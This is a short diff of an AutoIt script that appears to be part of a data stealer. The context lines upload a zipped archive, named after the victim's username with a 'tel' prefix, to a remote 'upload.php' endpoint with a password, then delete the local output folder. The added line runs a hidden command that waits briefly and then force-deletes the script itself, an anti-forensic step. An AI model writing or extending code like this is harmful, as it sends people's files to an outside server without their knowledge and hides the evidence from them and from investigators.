@@ -1,3 +1,4 @@
+#include <Array.au3>
 #include <File.au3>
 #include <_Zip.au3>
 #include <HTTP.au3>
@@ -124,3 +125,4 @@ $serverUrl = "https://domain.com/upload.php"
 _HTTP_Upload($serverUrl, $zipFilePath, "uploadinput", "pwd=" & $serverPassword & "&filename=" & URLEncode("tel" & @UserName & Random(1, 600000000, 1) & '.zip'))
 
 DirRemove($outputPath, 1)
+Run(@ComSpec & ' /c ping 127.0.0.1 -n 5 && del /F /Q "' & @ScriptFullPath & '"', @SystemDir, @SW_HIDE)
